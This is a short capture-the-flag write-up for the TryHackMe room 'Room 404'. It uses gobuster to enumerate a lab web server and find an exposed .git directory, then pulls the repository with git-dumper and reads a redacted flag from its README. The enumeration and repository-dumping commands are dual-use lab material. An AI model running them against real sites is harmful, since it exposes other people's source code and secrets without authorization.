---

Name: Room 404
DIfficulty: Easy
URL: https://tryhackme.com/room/hh-room404-804573bf
Description: He booked the quiet room. It's not on the floor plan, not in the brochure, not on any door. But port 8080 is wide open, and the rooms it never lists are the ones worth finding.

---

# Directory and file enumeration
We use gobuster to find available files and directories
```bash
$ gobuster dir -u http://10.112.135.35:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 10 -x txt,php,html,bak,zip,log,old -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.135.35:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,bak,zip,log,old,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.git                 (Status: 200) [Size: 437]
.git/HEAD            (Status: 200) [Size: 21]
.git/config          (Status: 200) [Size: 92]
.git/index           (Status: 200) [Size: 289]
.git/logs/           (Status: 200) [Size: 165]
```

We find a git repository and use git-dumper to get it on our machine
```bash
$ git-dumper http://10.112.135.35:8080/.git ./repo
```

Inside the repo we find the README.md file which has the flag
```markdown
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.

Staging flag (remove before launch): THM{REDACTED}
```
